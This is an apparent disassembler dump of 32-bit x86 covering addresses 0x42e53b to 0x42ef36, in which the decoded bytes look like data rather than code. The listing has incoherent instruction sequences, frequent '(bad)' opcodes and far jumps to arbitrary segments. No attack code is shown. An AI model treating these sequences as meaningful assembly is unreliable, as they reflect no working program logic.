  42e53b:	push   ss
  42e53c:	pop    eax
  42e53d:	das    
  42e53e:	stc    
  42e53f:	mov    bl,BYTE PTR [esi-0x38202452]
  42e545:	shl    BYTE PTR [esp+edx*8+0x5b],cl
  42e549:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e54a:	xor    DWORD PTR [ebx+0x62],edx
  42e54d:	cmp    DWORD PTR [edi-0x1921495f],esi
  42e553:	add    al,BYTE PTR [ebp+0x18]
  42e556:	inc    esp
  42e557:	mov    ds:0xc84eb149,al
  42e55c:	inc    ebx
  42e55d:	ret    0x6c23
  42e560:	cdq    
  42e561:	jecxz  0x42e533
  42e563:	adc    al,0xae
  42e565:	(bad)  
  42e566:	or     al,0xf4
  42e568:	push   ss
  42e569:	mov    dh,0x3d
  42e56b:	dec    ecx
  42e56c:	or     al,0x3e
  42e56e:	call   0x9ccf3ca9
  42e573:	mov    ah,0xc9
  42e575:	jo     0x42e5a2
  42e577:	cmp    dh,BYTE PTR [edx-0x1085f]
  42e57d:	sahf   
  42e57e:	outs   dx,DWORD PTR ds:[esi]
  42e57f:	xor    DWORD PTR [esp+edi*1-0x29],esp
  42e583:	fst    DWORD PTR [eax+ebx*4-0x4f]
  42e587:	shl    edx,cl
  42e589:	sbb    esp,DWORD PTR [ecx+0x69]
  42e58c:	(bad)  [edi+0x2074]
	...
  42e5f2:	add    BYTE PTR [eax],al
  42e5f4:	push   ebp
  42e5f5:	cmp    dh,cl
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	adc    ah,BYTE PTR [esi-0x6f]
  42e603:	mov    ah,0x44
  42e605:	lock add DWORD PTR [eax],eax
  42e608:	add    al,0x1
  42e60a:	add    BYTE PTR [eax],al
  42e60c:	jl     0x42e64f
  42e60e:	ins    BYTE PTR es:[edi],dx
  42e60f:	dec    ebp
  42e610:	ret    
  42e611:	inc    ebx
  42e612:	push   edx
  42e613:	aad    0x6a
  42e615:	sbb    esi,DWORD PTR [ecx]
  42e617:	dec    esp
  42e618:	arpl   WORD PTR [edi-0x3a],di
  42e61b:	dec    esp
  42e61c:	outs   dx,DWORD PTR ds:[esi]
  42e61d:	cwde   
  42e61e:	repz sahf 
  42e620:	xor    al,0xfc
  42e622:	xor    bl,BYTE PTR [edx]
  42e624:	inc    ebx
  42e625:	clc    
  42e626:	outs   dx,DWORD PTR ds:[esi]
  42e627:	mov    edx,DWORD PTR [edi+0x3c]
  42e62a:	push   esp
  42e62b:	jecxz  0x42e673
  42e62d:	inc    esi
  42e62e:	inc    ebx
  42e62f:	or     esp,DWORD PTR [esp+eax*2]
  42e632:	mul    DWORD PTR [edx+0x315b2fcd]
  42e638:	lods   eax,DWORD PTR ds:[esi]
  42e639:	stos   DWORD PTR es:[edi],eax
  42e63a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e63b:	sbb    cl,BYTE PTR [ecx-0x27fdf52f]
  42e641:	imul   edx,DWORD PTR [ebx+0x4f1f4832],0xfffffffb
  42e648:	pop    ss
  42e649:	jg     0x42e5d2
  42e64b:	mov    al,ds:0x990f7fab
  42e650:	jbe    0x42e6d1
  42e652:	push   ecx
  42e653:	adc    eax,0x8764f753
  42e658:	xor    cl,BYTE PTR [esp+edi*4]
  42e65b:	stos   BYTE PTR es:[edi],al
  42e65c:	adc    al,0x3a
  42e65e:	inc    ecx
  42e65f:	mov    ebp,0xd9ec77f1
  42e664:	dec    ebx
  42e665:	iret   
  42e666:	test   eax,0x33d82cf8
  42e66b:	fsubr  QWORD PTR [eax+0x25]
  42e66e:	cwde   
  42e66f:	push   ds
  42e670:	jno    0x42e652
  42e672:	inc    eax
  42e673:	jbe    0x42e6ac
  42e675:	xor    BYTE PTR [ecx+0x332dfe92],0x7a
  42e67c:	and    DWORD PTR [ebx-0x30],ebp
  42e67f:	mov    ss,eax
  42e681:	add    dh,BYTE PTR [ebx]
  42e683:	mov    ecx,0x3c85c1b4
  42e688:	xor    BYTE PTR [ebx],0x2e
  42e68b:	out    dx,al
  42e68c:	sbb    WORD PTR [ecx+0x1270886c],0xf1c5
  42e695:	addr16 jns 0x42e706
  42e698:	dec    edi
  42e699:	inc    esi
  42e69a:	sub    dl,dl
  42e69c:	add    cl,bh
  42e69e:	jmp    DWORD PTR [esi+0x5c]
  42e6a1:	imul   esi,ecx,0x78
  42e6a4:	pop    ecx
  42e6a5:	mov    ebp,DWORD PTR [ebp-0x499aaf5a]
  42e6ab:	es ins BYTE PTR es:[edi],dx
  42e6ad:	lods   eax,DWORD PTR ds:[esi]
  42e6ae:	mov    edi,0x58d20f95
  42e6b3:	leave  
  42e6b4:	in     eax,dx
  42e6b5:	lods   eax,DWORD PTR ds:[esi]
  42e6b6:	push   esi
  42e6b7:	cmp    dh,ch
  42e6b9:	xlat   BYTE PTR ds:[ebx]
  42e6ba:	sub    eax,0x9e570269
  42e6bf:	xor    eax,0x7c8439bb
  42e6c4:	xor    al,0x3b
  42e6c6:	cmp    esp,DWORD PTR [edx]
  42e6c8:	out    0x32,eax
  42e6ca:	shl    BYTE PTR [esi+eiz*4],1
  42e6cd:	out    dx,al
  42e6ce:	jnp    0x42e69b
  42e6d0:	pop    esp
  42e6d1:	and    ch,BYTE PTR [ebp-0x46849881]
  42e6d7:	ins    BYTE PTR es:[edi],dx
  42e6d8:	mov    esi,0x2f048b38
  42e6dd:	pop    ecx
  42e6de:	xchg   ecx,eax
  42e6df:	sub    eax,0x85fa32b4
  42e6e4:	pop    ecx
  42e6e5:	aaa    
  42e6e6:	stc    
  42e6e7:	adc    ebx,esp
  42e6e9:	jmp    0x672d:0x28c291a6
  42e6f0:	and    edx,DWORD PTR ds:0xf32e9a94
  42e6f6:	hlt    
  42e6f7:	jg     0x42e70e
  42e6f9:	mov    al,ds:0x7a180925
  42e6fe:	int3   
  42e6ff:	xchg   edi,eax
  42e700:	cmp    eax,0x367c54d5
  42e705:	xor    BYTE PTR [eax-0x80],cl
  42e708:	mov    eax,ds:0x43576bbb
  42e70d:	cld    
  42e70e:	popf   
  42e70f:	add    DWORD PTR [eax],0x0
	...
  42e772:	add    BYTE PTR [eax],al
  42e774:	pop    edx
  42e775:	cmp    DWORD PTR [esi+0x2d],ecx
  42e778:	outs   dx,DWORD PTR ds:[esi]
  42e779:	jg     0x42e7f6
  42e77b:	jg     0x42e7e1
  42e77d:	sub    BYTE PTR [esi],cl
  42e77f:	fidivr DWORD PTR [eax+0x484b171a]
  42e785:	icebp  
  42e786:	add    DWORD PTR [eax],eax
  42e788:	add    al,0x1
  42e78a:	add    BYTE PTR [eax],al
  42e78c:	xor    al,0x9
  42e78e:	fwait
  42e78f:	test   ch,al
  42e791:	sub    al,0xe0
  42e793:	sub    ah,BYTE PTR ds:0x80c72864
  42e799:	int3   
  42e79a:	jmp    0x42e7ac
  42e79c:	ins    BYTE PTR es:[edi],dx
  42e79d:	push   ebx
  42e79e:	mov    ds:0x3af57a59,eax
  42e7a3:	push   ds
  42e7a4:	in     eax,dx
  42e7a5:	sbb    BYTE PTR [edi],cl
  42e7a7:	mov    esi,0xec456816
  42e7ac:	sbb    ecx,DWORD PTR [eax+0x2b4ee37b]
  42e7b2:	mov    edx,eax
  42e7b4:	sahf   
  42e7b5:	cmp    ah,bh
  42e7b7:	dec    ebp
  42e7b8:	and    al,0x13
  42e7ba:	inc    ebp
  42e7bb:	add    al,0x75
  42e7bd:	pop    edi
  42e7be:	jo     0x42e7bc
  42e7c0:	cs repz pushf 
  42e7c3:	lea    esi,[edi+0x51]
  42e7c6:	push   ss
  42e7c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e7c8:	sub    al,0x84
  42e7ca:	mov    WORD PTR [ebx],?
  42e7cc:	sti    
  42e7cd:	mov    al,0x91
  42e7cf:	and    ecx,DWORD PTR [eax+0x65105886]
  42e7d5:	mov    cl,0x8b
  42e7d7:	inc    edx
  42e7d8:	pop    ebp
  42e7d9:	inc    edi
  42e7da:	mov    ecx,0x41a39c88
  42e7df:	sbb    bl,BYTE PTR [edx]
  42e7e1:	lods   al,BYTE PTR ds:[esi]
  42e7e2:	imul   DWORD PTR [edx]
  42e7e4:	call   0x20cf6502
  42e7e9:	repnz and cl,0xe2
  42e7ed:	mov    al,ds:0xaa740c2b
  42e7f2:	mov    edx,0xca3e467d
  42e7f7:	lea    esi,[ecx+0x4004c217]
  42e7fd:	xor    DWORD PTR [ebx+0x30fae2a6],eax
  42e803:	cmp    BYTE PTR [esi+eax*1+0xd8c48e],dl
  42e80a:	sti    
  42e80b:	cmp    DWORD PTR [edi],esp
  42e80d:	push   ss
  42e80e:	out    0x34,eax
  42e810:	(bad)
  42e814:	loopne 0x42e7e8
  42e816:	js     0x42e814
  42e818:	pop    es
  42e819:	jl     0x42e7cc
  42e81b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e81c:	cli    
  42e81d:	mov    al,0xe0
  42e81f:	gs push es
  42e821:	push   ecx
  42e822:	inc    ebp
  42e823:	pop    ebp
  42e824:	sub    ebp,DWORD PTR [ebp+0x6c0ec71]
  42e82a:	jo     0x42e842
  42e82c:	cmp    ah,bh
  42e82e:	inc    edx
  42e82f:	test   esi,esi
  42e831:	jbe    0x42e84a
  42e833:	out    0x22,eax
  42e835:	imul   ebx,DWORD PTR [ecx-0xcec7724],0x8d94746f
  42e83f:	mov    ebp,0x8373617c
  42e844:	popf   
  42e845:	add    cl,BYTE PTR [ebx-0x2d]
  42e848:	xor    DWORD PTR [esi],edi
  42e84a:	sub    al,0x5c
  42e84c:	lods   al,BYTE PTR ds:[esi]
  42e84d:	push   ebp
  42e84e:	push   ebp
  42e84f:	pop    esp
  42e850:	mov    edi,0xa79d87f4
  42e855:	scas   eax,DWORD PTR es:[edi]
  42e856:	imul   eax,DWORD PTR [esp+edx*1],0xddea33d4
  42e85d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e85e:	cmp    eax,0x7f026ae
  42e863:	xchg   ebp,ecx
  42e865:	ss dec ecx
  42e867:	mov    cl,0xd9
  42e869:	sahf   
  42e86a:	ins    BYTE PTR es:[edi],dx
  42e86b:	or     al,BYTE PTR [esp-0x59eece9f]
  42e872:	les    ebp,FWORD PTR [eax+0xfbe5dc6]
  42e878:	pop    esp
  42e879:	jecxz  0x42e825
  42e87b:	addr16 loopne 0x42e810
  42e87e:	(bad)  
  42e880:	add    BYTE PTR [esi+0x2],bl
  42e883:	pushf  
  42e884:	add    DWORD PTR [edx+0x55],esi
  42e887:	jo     0x42e810
  42e889:	dec    esp
  42e88a:	and    DWORD PTR ds:0x6294d50d,edx
	...
  42e8f4:	ret    
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx+0x323f82b]
  42e901:	lods   eax,DWORD PTR ds:[esi]
  42e902:	or     ch,BYTE PTR [edi]
  42e904:	dec    esp
  42e905:	repnz add DWORD PTR [eax],eax
  42e908:	add    al,0x1
  42e90a:	add    BYTE PTR [eax],al
  42e90c:	mov    ebx,0x87dc8a63
  42e911:	ds xor al,0x7a
  42e914:	nop
  42e915:	mov    DWORD PTR [edi],eax
  42e917:	out    dx,eax
  42e918:	add    DWORD PTR [edi-0x61a37ecb],esp
  42e91e:	nop
  42e91f:	xor    ecx,esi
  42e921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e922:	jo     0x42e95b
  42e924:	lods   al,BYTE PTR ds:[esi]
  42e925:	jg     0x42e8ed
  42e927:	adc    DWORD PTR [eax-0x51],edi
  42e92a:	mov    ebx,0x8808466c
  42e92f:	xchg   BYTE PTR [ecx+0x71],dl
  42e932:	popa   
  42e933:	mov    ebp,0x6aab3c18
  42e938:	cmp    ch,BYTE PTR [edx]
  42e93a:	mov    DWORD PTR [eax+0x5a],eax
  42e93d:	jp     0x42e9a8
  42e93f:	iret   
  42e940:	test   eax,0xaeff9987
  42e945:	inc    edi
  42e946:	shl    ecx,0x22
  42e949:	fisttp WORD PTR [ecx]
  42e94b:	add    BYTE PTR [ebp+0x3401cff2],dh
  42e951:	stos   BYTE PTR es:[edi],al
  42e952:	fiadd  DWORD PTR [edx-0x1a]
  42e955:	push   ebx
  42e956:	adc    al,0x7d
  42e958:	push   0x5b
  42e95a:	dec    esi
  42e95b:	cli    
  42e95c:	inc    eax
  42e95d:	iret   
  42e95e:	and    al,0x2f
  42e960:	mov    cl,0xe2
  42e962:	jle    0x42e977
  42e964:	mov    al,0x12
  42e966:	sbb    al,0x83
  42e968:	adc    ch,al
  42e96a:	les    ebp,FWORD PTR [edi+edi*1]
  42e96d:	mov    ch,0xb3
  42e96f:	jge    0x42e9d7
  42e971:	mov    esi,0x8462290b
  42e976:	(bad)  
  42e977:	outs   dx,BYTE PTR ds:[esi]
  42e978:	inc    dx
  42e97a:	and    al,0xd7
  42e97c:	fisttp QWORD PTR [ecx]
  42e97e:	arpl   WORD PTR [ebx+0x4aa00],bx
  42e984:	pop    ds
  42e985:	test   BYTE PTR [edx-0x2db1480c],dh
  42e98b:	inc    ebx
  42e98c:	in     al,dx
  42e98d:	aad    0xb6
  42e98f:	jnp    0x42e972
  42e991:	pusha  
  42e992:	mov    al,ds:0x585603ae
  42e997:	(bad)  
  42e998:	push   ebp
  42e999:	xlat   BYTE PTR ds:[ebx]
  42e99a:	pop    ebx
  42e99b:	pusha  
  42e99c:	sbb    al,0xe2
  42e99e:	dec    edi
  42e99f:	fadd   st,st(2)
  42e9a1:	cwde   
  42e9a2:	inc    esp
  42e9a3:	mov    ebp,0x78073318
  42e9a8:	xor    dh,bl
  42e9aa:	mov    ch,0x48
  42e9ac:	fwait
  42e9ad:	adc    BYTE PTR [edi],0xff
  42e9b0:	call   0xe9b2:0x93647060
  42e9b7:	test   ebx,eax
  42e9b9:	jg     0x42e972
  42e9bb:	mov    ch,0xf3
  42e9bd:	lea    edi,[esi]
  42e9bf:	daa    
  42e9c0:	jmp    0x4a13:0xe530b840
  42e9c7:	out    dx,al
  42e9c8:	test   BYTE PTR [esi],al
  42e9ca:	mov    dh,0x38
  42e9cc:	adc    eax,ebp
  42e9ce:	hlt    
  42e9cf:	push   0x1ebf3f31
  42e9d4:	pop    esp
  42e9d5:	jmp    0xb8b05bd2
  42e9da:	(bad)  
  42e9db:	fidiv  DWORD PTR [ebx+eiz*4-0x59]
  42e9df:	idiv   DWORD PTR [edi-0x44]
  42e9e2:	aam    0x83
  42e9e4:	dec    esi
  42e9e5:	xor    bh,ah
  42e9e7:	stos   DWORD PTR es:[edi],eax
  42e9e8:	jb     0x42e977
  42e9ea:	cmp    esp,DWORD PTR [eax]
  42e9ec:	mov    ds:0x3b625187,al
  42e9f1:	mov    ebx,0x1ba90159
  42e9f6:	pop    eax
  42e9f7:	ja     0x42ea1b
  42e9f9:	xlat   BYTE PTR ds:[ebx]
  42e9fa:	adc    dl,BYTE PTR [eax+edi*8+0x42]
  42e9fe:	or     BYTE PTR [ebx+0x9],dh
  42ea01:	mov    ch,0x36
  42ea03:	ret    
  42ea04:	rcr    BYTE PTR [edx],cl
  42ea06:	cli    
  42ea07:	ins    BYTE PTR es:[edi],dx
  42ea08:	(bad)  
  42ea09:	daa    
  42ea0a:	mov    al,0xb1
  42ea0c:	jae    0x42ea55
  42ea0e:	(bad)
	...
  42ea71:	add    BYTE PTR [eax],al
  42ea73:	add    ch,ah
  42ea75:	mov    edx,0xebdfe392
  42ea7a:	cmc    
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	imul   edx,DWORD PTR [ebp+edx*8-0xf],0x1f350
  42ea88:	add    al,0x1
  42ea8a:	add    BYTE PTR [eax],al
  42ea8c:	hlt    
  42ea8d:	xchg   DWORD PTR [ecx],edx
  42ea8f:	ja     0x42ea26
  42ea91:	cmp    eax,0xe6675174
  42ea96:	mov    al,ds:0x7216dd5d
  42ea9b:	xor    eax,DWORD PTR ds:0xcf0a029f
  42eaa1:	scas   al,BYTE PTR es:[edi]
  42eaa2:	and    DWORD PTR [eax+eax*4],esi
  42eaa5:	add    esp,DWORD PTR [ebx-0x2209ebf9]
  42eaab:	cmp    BYTE PTR [edi+0x2621f763],ch
  42eab1:	mov    dh,0xcf
  42eab3:	test   BYTE PTR [ebx-0x3f2bbf12],ah
  42eab9:	stos   BYTE PTR es:[edi],al
  42eaba:	cmp    DWORD PTR [ebp-0x67e38415],0xfffffff5
  42eac1:	(bad)  
  42eac2:	push   ecx
  42eac3:	pusha  
  42eac4:	js     0x42eacc
  42eac6:	sub    ebp,ebx
  42eac8:	push   ebp
  42eac9:	and    al,0x67
  42eacb:	test   eax,0x42c8c51c
  42ead0:	dec    esp
  42ead1:	clc    
  42ead2:	imul   ebp,DWORD PTR [edi],0xffffffdf
  42ead5:	shr    DWORD PTR [ecx+eiz*2+0x74171381],cl
  42eadc:	loop   0x42eaa6
  42eade:	sti    
  42eadf:	and    ebp,esi
  42eae1:	xor    eax,0xeb688730
  42eae6:	in     eax,0x76
  42eae8:	xchg   ebx,eax
  42eae9:	or     bl,BYTE PTR [ecx]
  42eaeb:	inc    edi
  42eaec:	ret    
  42eaed:	leave  
  42eaee:	clc    
  42eaef:	(bad)  
  42eaf0:	lahf   
  42eaf1:	dec    ebx
  42eaf2:	ror    DWORD PTR [esi-0x58],cl
  42eaf5:	ja     0x42eb72
  42eaf7:	or     ebp,esi
  42eaf9:	cmp    DWORD PTR [esi-0x57f82ab],0xe609e832
  42eb03:	fiadd  WORD PTR ds:0xad68b909
  42eb09:	jnp    0x42eb82
  42eb0b:	xchg   ebp,eax
  42eb0c:	stc    
  42eb0d:	fild   DWORD PTR [ecx-0xb9b47cf]
  42eb13:	or     al,0xf4
  42eb15:	je     0xf5100360
  42eb1b:	aaa    
  42eb1c:	xor    eax,0x7d57352d
  42eb21:	mov    ebx,ecx
  42eb23:	inc    ebp
  42eb24:	pop    ds
  42eb25:	sub    BYTE PTR [esi],bl
  42eb27:	xchg   ebp,eax
  42eb28:	xlat   BYTE PTR ds:[ebx]
  42eb29:	popf   
  42eb2a:	jnp    0x42eba1
  42eb2c:	add    edi,ecx
  42eb2e:	stos   BYTE PTR es:[edi],al
  42eb2f:	fsubr  QWORD PTR fs:[esi+0x23f3f035]
  42eb36:	mov    cl,0xcc
  42eb38:	std    
  42eb39:	dec    BYTE PTR [edi]
  42eb3b:	sti    
  42eb3c:	ja     0x42eb72
  42eb3e:	gs push 0x781508b2
  42eb44:	inc    eax
  42eb45:	or     ebp,ecx
  42eb47:	stos   BYTE PTR es:[edi],al
  42eb48:	mov    edi,0x9287e1f7
  42eb4d:	jae    0x42eb8c
  42eb4f:	push   0x26721c61
  42eb54:	sbb    bh,BYTE PTR [eax+0x71209fcf]
  42eb5a:	dec    edx
  42eb5b:	mov    ebx,0xeaa3fd8c
  42eb60:	sahf   
  42eb61:	inc    ebp
  42eb62:	sti    
  42eb63:	sub    eax,0x28588777
  42eb68:	sub    al,0x8
  42eb6a:	and    al,BYTE PTR [ecx-0x4871b480]
  42eb70:	xor    ebx,edi
  42eb72:	jns    0x42eb46
  42eb74:	xchg   esp,eax
  42eb75:	aam    0xe6
  42eb77:	mov    ecx,0xb4192d26
  42eb7c:	or     BYTE PTR [ebp+0x4d],ah
  42eb7f:	xchg   ecx,eax
  42eb80:	push   ebp
  42eb81:	pop    ecx
  42eb82:	sbb    al,al
  42eb84:	bound  esi,QWORD PTR [esi]
  42eb86:	stc    
  42eb87:	adc    ch,ah
  42eb89:	sub    eax,0xcc48f038
  42eb8e:	retf   0x5c
	...
  42ebf1:	add    BYTE PTR [eax],al
  42ebf3:	add    BYTE PTR [esi+0x41],bh
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	or     DWORD PTR [esi],0x5488e496
  42ec05:	hlt    
  42ec06:	add    DWORD PTR [eax],eax
  42ec08:	add    al,0x1
  42ec0a:	add    BYTE PTR [eax],al
  42ec0c:	jb     0x42ec68
  42ec0e:	pushf  
  42ec0f:	and    DWORD PTR [ecx+0x2f8e9b6a],eax
  42ec15:	jl     0x42ec30
  42ec17:	mov    al,0x3b
  42ec19:	in     al,0x16
  42ec1b:	pop    ss
  42ec1c:	mov    bl,0xe4
  42ec1e:	call   0xd04dd200
  42ec23:	(bad)  
  42ec24:	fld    QWORD PTR [edi+ebp*2]
  42ec27:	xor    al,0x97
  42ec29:	sub    cl,al
  42ec2b:	adc    al,0xb
  42ec2d:	push   ebx
  42ec2e:	in     eax,dx
  42ec2f:	call   0x619111ea
  42ec34:	lock cmp eax,0x679e6c22
  42ec3a:	adc    edx,eax
  42ec3c:	xor    cl,0x58
  42ec3f:	xchg   DWORD PTR [ebp-0x2],edx
  42ec42:	enter  0xbed2,0x70
  42ec46:	das    
  42ec47:	outs   dx,DWORD PTR ds:[esi]
  42ec48:	(bad)  [ecx-0x21d2f81d]
  42ec4e:	bound  ecx,QWORD PTR [ebx]
  42ec50:	adc    DWORD PTR [edx+ecx*2+0x1c],ebx
  42ec54:	mov    esi,0x6aad06ca
  42ec59:	and    BYTE PTR [eax],bh
  42ec5b:	in     eax,0x43
  42ec5d:	sahf   
  42ec5e:	lods   al,BYTE PTR ds:[esi]
  42ec5f:	shl    DWORD PTR ds:0x2408d5ce,0xd0
  42ec66:	inc    edi
  42ec67:	retf   0x5814
  42ec6a:	in     al,0x73
  42ec6c:	out    0x92,al
  42ec6e:	cld    
  42ec6f:	in     eax,dx
  42ec70:	repnz mov esi,0x39b32a01
  42ec76:	lds    ecx,FWORD PTR [edx]
  42ec78:	setns  BYTE PTR [eax]
  42ec7b:	mov    eax,0x2171c94d
  42ec80:	inc    edi
  42ec81:	push   ds
  42ec82:	inc    eax
  42ec83:	rol    cl,0x8f
  42ec86:	aaa    
  42ec87:	mov    edi,DWORD PTR [esi]
  42ec89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec8a:	outs   dx,BYTE PTR ds:[esi]
  42ec8b:	xchg   ebx,eax
  42ec8c:	test   al,0x2c
  42ec8e:	(bad)  
  42ec8f:	mov    cl,BYTE PTR [esi+0x18]
  42ec92:	repz or ch,BYTE PTR gs:0xd754500b
  42ec9a:	idiv   DWORD PTR gs:[edi+0x6655666f]
  42eca1:	mov    ecx,0x867cd22f
  42eca6:	into   
  42eca7:	mov    ebx,0xba0d4552
  42ecac:	ret    0xf2d3
  42ecaf:	add    eax,0x2112542
  42ecb4:	push   edi
  42ecb5:	inc    eax
  42ecb6:	push   edi
  42ecb7:	fs je  0x42ecee
  42ecba:	and    DWORD PTR [edi+esi*2+0x73ec74cc],0x1a42a076
  42ecc5:	push   ecx
  42ecc6:	in     eax,dx
  42ecc7:	and    eax,0x6420cdc9
  42eccc:	loope  0x42ed3b
  42ecce:	sti    
  42eccf:	mov    edi,0x7850cf4d
  42ecd4:	es push cs
  42ecd6:	je     0x42ed19
  42ecd8:	dec    esi
  42ecd9:	cdq    
  42ecda:	add    eax,edi
  42ecdc:	lds    eax,FWORD PTR [ecx]
  42ecde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ecdf:	outs   dx,DWORD PTR ds:[esi]
  42ece0:	ja     0x42ed47
  42ece2:	inc    eax
  42ece3:	fcom   DWORD PTR [ebx+0x6e]
  42ece6:	(bad)  
  42ece7:	xor    eax,0x1ff6a5c0
  42ecec:	fs inc edx
  42ecee:	xchg   esp,eax
  42ecef:	pusha  
  42ecf0:	push   ss
  42ecf1:	loop   0x42ecb0
  42ecf3:	int3   
  42ecf4:	xchg   ebx,eax
  42ecf5:	or     al,0x59
  42ecf7:	jg     0x42ecb5
  42ecf9:	jg     0x42ed14
  42ecfb:	push   ecx
  42ecfc:	inc    edx
  42ecfd:	fidiv  WORD PTR [esi+0x58f98ca1]
  42ed03:	lahf   
  42ed04:	call   0x378c:0x4970f62a
  42ed0b:	(bad)  
  42ed0c:	cwde   
  42ed0d:	dec    ecx
  42ed0e:	pop    ebx
  42ed0f:	test   DWORD PTR [eax],eax
	...
  42ed71:	add    BYTE PTR [eax],al
  42ed73:	add    BYTE PTR [edx],ch
  42ed75:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed7b:	mul    bl
  42ed7d:	xor    al,BYTE PTR [ebp-0x754d15e]
  42ed83:	iret   
  42ed84:	pop    eax
  42ed85:	cmc    
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    al,0x1
  42ed8a:	add    BYTE PTR [eax],al
  42ed8c:	leave  
  42ed8d:	inc    DWORD PTR ds:0xd226c921
  42ed93:	and    eax,0x96e41d38
  42ed98:	fldenv [esi-0x43454272]
  42ed9e:	arpl   WORD PTR [eax+0x79],bx
  42eda1:	xor    ebp,DWORD PTR [ebx]
  42eda3:	mov    WORD PTR [esi+0x3c84a5d8],ds
  42eda9:	ja     0x42ed36
  42edab:	push   ss
  42edac:	fsubr  QWORD PTR [edx]
  42edae:	cmc    
  42edaf:	push   edx
  42edb0:	inc    ebp
  42edb1:	ret    
  42edb2:	push   esi
  42edb3:	(bad)  
  42edb4:	jl     0x42edd9
  42edb6:	or     eax,0x9fa5ebc3
  42edbb:	push   0x9dd956f
  42edc0:	mov    ds:0x6e4464d7,al
  42edc5:	mov    ah,0x44
  42edc7:	enter  0xd1f6,0x2
  42edcb:	mov    ch,0x32
  42edcd:	or     al,0xa4
  42edcf:	lods   eax,DWORD PTR ds:[esi]
  42edd0:	rcr    DWORD PTR ss:[ebx],cl
  42edd3:	push   esp
  42edd4:	outs   dx,DWORD PTR ds:[esi]
  42edd5:	mov    esp,0xe164d27d
  42edda:	jecxz  0x42ee54
  42eddc:	jns    0x42ed9d
  42edde:	mov    ebx,0xbb34f20a
  42ede3:	push   0xffffffd3
  42ede5:	xchg   edx,eax
  42ede6:	pop    es
  42ede7:	dec    eax
  42ede8:	push   edi
  42ede9:	inc    esp
  42edea:	repnz inc ebp
  42edec:	es stc 
  42edee:	ret    0x241f
  42edf1:	sub    BYTE PTR [esi+0x457c909c],ah
  42edf7:	cwde   
  42edf8:	add    eax,DWORD PTR [edi-0x28]
  42edfb:	inc    ecx
  42edfc:	pop    edi
  42edfd:	int    0xc7
  42edff:	add    dl,ch
  42ee01:	cmp    esp,DWORD PTR [ebx+0x5d1d4f4e]
  42ee07:	jns    0x42edbc
  42ee09:	fwait
  42ee0a:	push   eax
  42ee0b:	mov    ds:0xc5696eed,al
  42ee10:	lahf   
  42ee11:	xor    dl,BYTE PTR [edi]
  42ee13:	mov    ebp,0x60127eb3
  42ee18:	rcl    DWORD PTR [esp+edx*1],1
  42ee1b:	in     al,0x2e
  42ee1d:	mov    dh,0xa0
  42ee1f:	in     al,0x58
  42ee21:	std    
  42ee22:	repnz push edx
  42ee24:	imul   ebp,DWORD PTR [esi+0x77db0ec4],0xffffffcb
  42ee2b:	fcmovb st,st(4)
  42ee2d:	mov    ds,WORD PTR [ebx-0x4fb65c9a]
  42ee33:	mov    ebp,0x2ecbee32
  42ee38:	gs clc 
  42ee3a:	or     dh,BYTE PTR [eax+0x57]
  42ee3d:	sub    BYTE PTR [ebp-0x60fc843f],ch
  42ee43:	ret    0xca42
  42ee46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee47:	stc    
  42ee48:	xor    eax,esp
  42ee4a:	cmp    al,0x10
  42ee4c:	js     0x42eec9
  42ee4e:	add    al,0x1a
  42ee50:	in     eax,0xf
  42ee52:	retf   0x7f5c
  42ee55:	dec    ebx
  42ee56:	cmp    DWORD PTR [esi-0x6c54d8d2],ebx
  42ee5c:	scas   al,BYTE PTR es:[edi]
  42ee5d:	adc    ebx,esi
  42ee5f:	mov    cl,0xe2
  42ee61:	push   eax
  42ee62:	dec    ebx
  42ee63:	push   gs
  42ee65:	(bad)  
  42ee66:	aam    0xa8
  42ee68:	mov    dh,0x6a
  42ee6a:	imul   esi,ecx,0xfeec3cb2
  42ee70:	add    DWORD PTR [edx+0x528e652b],edi
  42ee76:	and    al,0x95
  42ee78:	dec    bl
  42ee7a:	or     eax,DWORD PTR [ebx-0x49]
  42ee7d:	mov    bh,0xc6
  42ee7f:	test   al,0x4d
  42ee81:	add    edx,esp
  42ee83:	xchg   esi,eax
  42ee84:	call   0x2cc0:0x5c3150c1
  42ee8b:	pop    ebp
  42ee8c:	iret   
  42ee8d:	inc    edi
  42ee8e:	cmp    bl,bh
	...
  42eef4:	ret    
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ef01:	push   cs
  42ef02:	cmp    al,0x43
  42ef04:	pop    esp
  42ef05:	test   BYTE PTR [ecx],0x0
  42ef08:	add    al,0x1
  42ef0a:	add    BYTE PTR [eax],al
  42ef0c:	push   ebx
  42ef0d:	hlt    
  42ef0e:	es inc edi
  42ef10:	xchg   ebp,eax
  42ef11:	enter  0x719,0xa9
  42ef15:	ss jle 0x42eec3
  42ef18:	gs jae 0x42eee2
  42ef1b:	push   cs
  42ef1c:	into   
  42ef1d:	jmp    0xa0fa:0x15057cba
  42ef24:	aad    0xfa
  42ef26:	inc    ecx
  42ef27:	test   edx,edx
  42ef29:	pop    ecx
  42ef2a:	ins    DWORD PTR es:[edi],dx
  42ef2b:	or     eax,0x40193f2e
  42ef30:	pop    ds
  42ef31:	mov    ch,BYTE PTR [ebp+0x22]
  42ef34:	cmp    al,0x49
  42ef36:	(bad)  
